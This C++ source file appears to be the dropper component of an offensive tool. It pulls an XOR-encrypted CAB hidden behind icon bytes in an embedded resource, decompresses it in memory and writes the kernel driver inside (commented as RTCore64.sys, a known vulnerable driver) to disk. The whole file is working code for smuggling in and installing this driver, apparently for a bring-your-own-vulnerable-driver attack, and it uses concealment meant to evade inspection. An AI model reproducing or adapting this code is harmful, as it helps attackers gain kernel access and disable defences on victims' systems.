#include "ResourceInstaller.h"
#include "ConfigManager.h"
#include <iostream>
#include <fdi.h>

#pragma comment(lib, "cabinet.lib")

namespace ResourceInstaller {

// ============================================================================
// MEMORY CONTEXT FOR CAB DECOMPRESSION
// ============================================================================

struct MemoryReadContext {
    const BYTE* data;
    size_t size;
    size_t offset;
};

static MemoryReadContext* g_cabContext = nullptr;
static std::vector<BYTE>* g_currentFileData = nullptr;

// ============================================================================
// FDI CALLBACKS FOR IN-MEMORY CAB OPERATIONS
// ============================================================================

static void* DIAMONDAPI fdi_alloc(ULONG cb) {
    return malloc(cb);
}

static void DIAMONDAPI fdi_free(void* pv) {
    free(pv);
}

static INT_PTR DIAMONDAPI fdi_open(char* pszFile, int oflag, int pmode) {
    return g_cabContext ? (INT_PTR)g_cabContext : -1;
}

static UINT DIAMONDAPI fdi_read(INT_PTR hf, void* pv, UINT cb) {
    MemoryReadContext* ctx = (MemoryReadContext*)hf;
    if (!ctx) return 0;
    
    size_t remaining = ctx->size - ctx->offset;
    size_t to_read = (cb < remaining) ? cb : remaining;
    
    if (to_read > 0) {
        memcpy(pv, ctx->data + ctx->offset, to_read);
        ctx->offset += to_read;
    }
    
    return static_cast<UINT>(to_read);
}

static UINT DIAMONDAPI fdi_write(INT_PTR hf, void* pv, UINT cb) {
    if (g_currentFileData && cb > 0) {
        BYTE* data = static_cast<BYTE*>(pv);
        g_currentFileData->insert(g_currentFileData->end(), data, data + cb);
    }
    return cb;
}

static int DIAMONDAPI fdi_close(INT_PTR hf) {
    g_currentFileData = nullptr;
    return 0;
}

static LONG DIAMONDAPI fdi_seek(INT_PTR hf, LONG dist, int seektype) {
    MemoryReadContext* ctx = (MemoryReadContext*)hf;
    if (!ctx) return -1;
    
    switch (seektype) {
        case SEEK_SET: ctx->offset = dist; break;
        case SEEK_CUR: ctx->offset += dist; break;
        case SEEK_END: ctx->offset = ctx->size + dist; break;
    }
    
    return static_cast<LONG>(ctx->offset);
}

static INT_PTR DIAMONDAPI fdi_notify(FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION pfdin) {
    std::vector<BYTE>* extractedData = static_cast<std::vector<BYTE>*>(pfdin->pv);
    
    switch (fdint) {
        case fdintCOPY_FILE:
            // Extract first file from CAB (RTCore64.sys)
            if (pfdin->psz1) {
                g_currentFileData = extractedData;
                return (INT_PTR)g_cabContext;
            }
            return 0;
            
        case fdintCLOSE_FILE_INFO:
            g_currentFileData = nullptr;
            return TRUE;
            
        default:
            break;
    }
    return 0;
}

// ============================================================================
// IN-MEMORY CAB DECOMPRESSION
// ============================================================================

std::vector<BYTE> DecompressCABFromMemory(const BYTE* cabData, size_t cabSize) {
    std::vector<BYTE> extractedFile;
    
    MemoryReadContext ctx = { cabData, cabSize, 0 };
    g_cabContext = &ctx;
    
    ERF erf{};
    HFDI hfdi = FDICreate(fdi_alloc, fdi_free, fdi_open, fdi_read, 
                          fdi_write, fdi_close, fdi_seek, cpuUNKNOWN, &erf);
    
    if (!hfdi) {
        std::wcout << L"[-] FDICreate failed (error: " << erf.erfOper << L")\n";
        g_cabContext = nullptr;
        return extractedFile;
    }
    
    char cabName[] = "memory.cab";
    char cabPath[] = "";
    
    BOOL result = FDICopy(hfdi, cabName, cabPath, 0, fdi_notify, nullptr, &extractedFile);
    
    FDIDestroy(hfdi);
    g_cabContext = nullptr;
    
    if (!result) {
        std::wcout << L"[-] FDICopy failed (error: " << erf.erfOper << L")\n";
        return std::vector<BYTE>();
    }
    
    return extractedFile;
}

// ============================================================================
// RESOURCE EXTRACTION WITH XOR DECRYPTION AND CAB DECOMPRESSION
// ============================================================================

std::vector<BYTE> ExtractAndDecryptDriver(HINSTANCE hInstance, int resourceId) {
    HRSRC hRes = FindResource(hInstance, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hRes) {
        std::wcout << L"[-] Failed to find driver resource\n";
        return {};
    }
    
    HGLOBAL hResData = LoadResource(hInstance, hRes);
    if (!hResData) {
        std::wcout << L"[-] Failed to load driver resource\n";
        return {};
    }
    
    DWORD resSize = SizeofResource(hInstance, hRes);
    const BYTE* resData = static_cast<const BYTE*>(LockResource(hResData));
    
    if (!resData || resSize == 0) {
        std::wcout << L"[-] Invalid resource data\n";
        return {};
    }
    
    std::wcout << L"[+] Extracted " << resSize << L" bytes from resource\n";
    
    // Skip first 1662 bytes (icon data), extract only XOR-encrypted CAB
    constexpr size_t ICON_SIZE = 1662;
    
    if (resSize <= ICON_SIZE) {
        std::wcout << L"[-] Resource too small - no driver data after icon\n";
        return {};
    }
    
    const BYTE* encryptedCabData = resData + ICON_SIZE;
    DWORD encryptedCabSize = resSize - ICON_SIZE;
    
    std::wcout << L"[+] Skipped " << ICON_SIZE << L" bytes of icon data\n";
    std::wcout << L"[+] Encrypted CAB size: " << encryptedCabSize << L" bytes\n";
    
    // XOR decrypt CAB in memory
    std::vector<BYTE> decryptedCab(encryptedCabData, encryptedCabData + encryptedCabSize);
    
    std::wcout << L"[*] XOR decrypting CAB...\n";
    for (size_t i = 0; i < decryptedCab.size(); ++i) {
        decryptedCab[i] ^= XOR_KEY[i % XOR_KEY_LEN];
    }
    
    std::wcout << L"[+] XOR decryption completed\n";
    
    // Decompress CAB from memory
    std::wcout << L"[*] Decompressing CAB from memory...\n";
    std::vector<BYTE> driverData = DecompressCABFromMemory(decryptedCab.data(), decryptedCab.size());
    
    if (driverData.empty()) {
        std::wcout << L"[-] CAB decompression failed\n";
        return {};
    }
    
    std::wcout << L"[+] CAB decompressed successfully\n";
    
    // Validate PE signature
    if (driverData.size() < 2 || driverData[0] != 'M' || driverData[1] != 'Z') {
        std::wcout << L"[-] Invalid PE signature after decompression\n";
        return {};
    }
    
    std::wcout << L"[+] Driver extracted successfully (PE signature valid)\n";
    std::wcout << L"[+] Final driver size: " << driverData.size() << L" bytes\n";
    
    return driverData;
}

// ============================================================================
// DRIVER INSTALLATION FROM RESOURCE
// ============================================================================

bool InstallDriverFromResource() {
    std::wcout << L"[*] Installing driver from embedded resource...\n";
    
    HINSTANCE hInstance = GetModuleHandleW(nullptr);
    if (!hInstance) {
        std::wcout << L"[-] Failed to get module handle\n";
        return false;
    }
    
    std::vector<BYTE> driverData = ExtractAndDecryptDriver(hInstance, 102);
    if (driverData.empty()) {
        std::wcout << L"[-] Failed to extract driver from resource\n";
        return false;
    }
    
    std::wstring driverPath = ConfigManager::GetDriverPath();
    std::wcout << L"[*] Target path: " << driverPath << L"\n";
    
    HANDLE hFile = CreateFileW(
        driverPath.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        std::wcout << L"[-] Failed to create driver file (error: " << error << L")\n";
        if (error == ERROR_ACCESS_DENIED) {
            std::wcout << L"[-] Access denied - run as Administrator\n";
        }
        return false;
    }
    
    DWORD bytesWritten = 0;
    bool writeSuccess = WriteFile(
        hFile,
        driverData.data(),
        static_cast<DWORD>(driverData.size()),
        &bytesWritten,
        nullptr
    );
    
    CloseHandle(hFile);
    
    if (!writeSuccess || bytesWritten != driverData.size()) {
        std::wcout << L"[-] Failed to write driver data\n";
        return false;
    }
    
    std::wcout << L"[+] Driver installed successfully (" << bytesWritten << L" bytes written)\n";
    return true;
}

bool IsDriverInstalled() {
    std::wstring driverPath = ConfigManager::GetDriverPath();
    DWORD attrib = GetFileAttributesW(driverPath.c_str());
    return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

} // namespace ResourceInstaller
